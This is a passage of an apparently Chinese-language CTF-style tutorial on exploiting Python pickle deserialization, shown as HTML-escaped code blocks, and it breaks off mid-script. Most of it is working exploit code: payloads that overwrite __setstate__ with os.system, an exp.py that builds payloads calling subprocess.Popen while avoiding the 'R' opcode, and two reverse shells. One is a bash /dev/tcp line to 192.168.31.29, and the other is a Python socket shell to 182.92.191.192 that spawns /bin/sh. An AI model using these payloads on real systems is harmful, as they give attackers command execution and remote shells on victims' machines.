&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;span style="color:#75715e"># b&amp;#34;c__main__\nsecret\np0\n0g0\n(}(S&amp;#39;name&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtbg0\n(}(S&amp;#39;category&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtb(S&amp;#39;frieggs&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ni__main__\nAnimal\np3\n0g3\n.&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者构造的exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;y&amp;#34;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>————所以在不允许&lt;code>b'R'&lt;/code>的情况下，思路则是篡改secret中的name和categoriy，单纯的用&lt;code>b'c'&lt;/code>引入模块对Animal进行实例化，这一过程也相当于是执行了函数&lt;/p>
&lt;/details>
&lt;p>一种解决办法就是这个栗子中的，干脆就不rce，而是用&lt;code>b'c'&lt;/code>变量覆盖，思路就是上个三级标题下面的那个大段，不再赘述。&lt;/p>
&lt;h3 id="--使用__setstate__bb实现rce">&amp;ndash;&amp;raquo;使用&lt;code>__setstate__&lt;/code>&amp;amp;&lt;code>b'b'&lt;/code>实现rce&lt;/h3>
&lt;p>另一种方式是用BUILD指令&lt;code>b'b'&lt;/code>及进行rce。&lt;/p>
&lt;p>在pickle源码中BUILD指令是这样的&lt;/p>
&lt;p>&lt;img src="https://pic2.zhimg.com/80/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img">&lt;/p>
&lt;p>如果一个实例inst拥有&lt;code>__setstate__&lt;/code>方法，则把&lt;code>state&lt;/code>交给&lt;code>__setstate__&lt;/code>方法来处理；否则直接把&lt;code>state&lt;/code>这个&lt;code>dist&lt;/code>的内容合并到&lt;code>inst.__dict__ &lt;/code>内。&lt;/p>
&lt;p>如果一个类原本没有&lt;code>__setstate__&lt;/code>这个方法，当我们用&lt;code>{'__setstate__': os.system}&lt;/code>来BUILD这个对象，那么现在对象的&lt;code>__setstate__&lt;/code>就变成了&lt;code>os.system&lt;/code>；接下来利用&lt;code>&amp;quot;ls /&amp;quot;&lt;/code>来再次BUILD这个对象，则会执行&lt;code>setstate(&amp;quot;ls /&amp;quot;)&lt;/code> ，而此时&lt;code>__setstate__&lt;/code>已经被我们设置为&lt;code>os.system&lt;/code>，因此实现了rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;amelia&amp;#39;&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">grade&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;A1&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Student&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">}(V__setstate__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">cos&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">system&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">ubVls /&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">b.&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># shell = b&amp;#34;&amp;#34;&amp;#34;\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubS&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;\nb.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025215320.png" alt="image-20210810025215320">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025143114.png" alt="image-20210810025143114">&lt;/p>
&lt;p>可以看到成功做到了rce~~反弹shell当然也可以&lt;/p>
&lt;h3 id="--使用_instantiateload_objload_instbobi实现rce">&amp;ndash;&amp;raquo;使用&lt;code>_instantiate()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>&amp;amp;&lt;code>b'o'&lt;/code>&amp;amp;&lt;code>b'i'&lt;/code>实现rce&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>_instantiate()&lt;/code>: Create a new object via klass(*args); Leads to arbitrary function call actually&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">or&lt;/span>
&lt;span style="color:#111">hasattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;__getinitargs__&amp;#34;&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#75715e"># Arbitrary function all&lt;/span>
&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;in constructor for &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">: &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exc_info&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__new__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_obj()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_obj&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># Stack is ... markobject classobject arg1 arg2 ...&lt;/span>
&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_obj&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_inst()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_inst&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># read from user input&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">klass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># get args from stack&lt;/span>
&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_inst&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">list&lt;/span>
&lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;((&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;lisubprocess&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Popen&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;print(&amp;#39;pwned!&amp;#39;)&amp;#34;&lt;/span>
&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 反弹shell当然也可 都说了是rce了&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pty&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#34;182.92.191.192&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">50000&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dup2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fileno&lt;/span>&lt;span style="color:#111">(),&lt;/span>&lt;span style="color:#111">fd&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">fd&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;span style="color:#111">pty&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">spawn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
